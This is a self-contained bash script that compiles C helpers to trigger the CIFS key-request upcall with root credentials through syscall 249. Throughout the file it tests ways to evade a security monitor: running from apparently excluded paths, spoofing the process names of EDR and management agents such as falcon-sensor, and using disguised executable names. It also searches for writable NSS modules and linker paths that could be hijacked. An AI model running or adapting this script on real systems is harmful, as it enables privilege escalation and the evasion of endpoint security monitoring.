#!/bin/bash
# SVE bypass test - all in one, no Python
set -e
WD="/tmp/sve_$$"
mkdir -p "$WD"

cat > "$WD/trig.c" << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
int main(int ac, char **av){
    char d[512];
    snprintf(d,sizeof(d),
        "ver=0x2;host=x;ip4=127.0.0.1;sec=krb5;uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
        getpid());
    if(ac>1 && strlen(av[1])>0)
        prctl(PR_SET_NAME, av[1], 0, 0, 0);
    errno=0;
    long r=syscall(249,"cifs.spnego",d,"",(-3));
    printf("PID=%d EXE=%s COMM=%s rk(cifs.spnego)=%ld errno=%d(%s)\n",
        getpid(), av[0], ac>1?av[1]:"(default)", r, errno, strerror(errno));
    return r<0?1:0;
}
CEOF
gcc -o "$WD/trig" "$WD/trig.c"

cat > "$WD/idmap_probe.c" << 'CEOF'
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
int main(){
    errno=0;
    long r=syscall(249,"cifs.idmap","uid:0","",(-3));
    printf("rk(cifs.idmap,uid:0)=%ld e=%d %s\n",r,errno,strerror(errno));
    errno=0;
    r=syscall(249,"cifs.idmap","oi:S-1-5-21-0-0-0-1000","",(-3));
    printf("rk(cifs.idmap,oi:S-1-5-21...)=%ld e=%d %s\n",r,errno,strerror(errno));
    return 0;
}
CEOF
gcc -o "$WD/idmap_probe" "$WD/idmap_probe.c"

echo "=== SVE BYPASS TEST ==="
echo ""

echo "--- 1. BASELINE (from /tmp) ---"
"$WD/trig"

echo ""
echo "--- 2. SVE PATH EXCLUSION ---"
for d in /opt/szef-client/ /opt/tivoli/cit/bin/ /opt/tivoli/cit/ /usr/local/bin/; do
    dst="${d}trig_test"
    if cp "$WD/trig" "$dst" 2>/dev/null && chmod +x "$dst" 2>/dev/null; then
        echo "  $d:"
        echo "  $("$dst" 2>&1)"
        rm -f "$dst" 2>/dev/null
    else
        echo "  $d: COPY FAILED"
    fi
done

echo ""
echo "--- 3. COMM NAME SPOOFING ---"
for n in velociraptor_c chef-client inspec falcon-sensor; do
    echo "  comm=$n: $("$WD/trig" "$n" 2>&1)"
done

echo ""
echo "--- 4. SYMLINK/EXE SPOOFING ---"
for name in velociraptor_client chef-client inspec cit_agent; do
    lnk="/tmp/$name"
    rm -f "$lnk" 2>/dev/null
    cp "$WD/trig" "$lnk" && chmod +x "$lnk"
    echo "  $name: $("$lnk" 2>&1)"
    rm -f "$lnk"
done

echo ""
echo "--- 5. COMBINED: EXCLUDED PATH + SPOOFED COMM ---"
for d in /opt/szef-client/ /opt/tivoli/cit/bin/ /usr/local/bin/; do
    dst="${d}velociraptor_client"
    if cp "$WD/trig" "$dst" 2>/dev/null && chmod +x "$dst" 2>/dev/null; then
        echo "  $dst (comm=falcon-sensor):"
        echo "  $("$dst" falcon-sensor 2>&1)"
        rm -f "$dst" 2>/dev/null
    fi
done

echo ""
echo "--- 6. CIFS.IDMAP HANDLER ---"
for b in /usr/sbin/cifs.idmap /sbin/cifs.idmap; do
    [ -f "$b" ] || continue
    echo "  $b:"
    echo "    NSS: $(strings "$b" 2>/dev/null | grep -iE 'getpwuid|getpwnam|nss|dlopen' | head -5)"
    echo "    Libs: $(ldd "$b" 2>/dev/null | head -10)"
    echo "    RPATH: $(readelf -d "$b" 2>/dev/null | grep -iE 'rpath|runpath')"
    echo "    Caps: $(getcap "$b" 2>/dev/null) mode=$(stat -c%a "$b" 2>/dev/null)"
done

echo ""
echo "--- 7. CIFS.IDMAP KEY STRACE ---"
timeout 10 strace -f -e trace=execve,openat,connect -o /tmp/st_idmap3.txt "$WD/idmap_probe" 2>&1
echo "  Handler trace:"
grep -E 'execve|dlopen|nss|nsswitch' /tmp/st_idmap3.txt 2>/dev/null | head -20

echo ""
echo "--- 8. CIFS.UPCALL ---"
for b in /usr/sbin/cifs.upcall /sbin/cifs.upcall; do
    [ -f "$b" ] || continue
    echo "  $b:"
    echo "    Perms: $(ls -la "$b")"
    echo "    Caps: $(getcap "$b" 2>/dev/null)"
    echo "    NSS: $(strings "$b" 2>/dev/null | grep -iE 'getpwuid|getpwnam|nss|nsswitch|dlopen' | head -10)"
    echo "    Libs: $(ldd "$b" 2>/dev/null | head -10)"
done

echo ""
echo "--- 9. NSSWITCH.CONF ---"
cat /etc/nsswitch.conf 2>/dev/null

echo ""
echo "--- 10. NSS MODULES ---"
ls -la /lib64/libnss_* /usr/lib64/libnss_* 2>/dev/null
find /lib64 /usr/lib64 -name 'libnss_*' -writable 2>/dev/null && echo "^^^ WRITABLE NSS MODULES ^^^"

echo ""
echo "--- 11. LD PATHS ---"
cat /etc/ld.so.conf 2>/dev/null
echo "---"
cat /etc/ld.so.conf.d/*.conf 2>/dev/null
echo "---"
for d in $(cat /etc/ld.so.conf.d/*.conf 2>/dev/null | grep ^/); do
    test -w "$d" && echo "WRITABLE LD PATH: $d"
done

# Cleanup
rm -rf "$WD"

echo ""
echo "=== DONE ==="
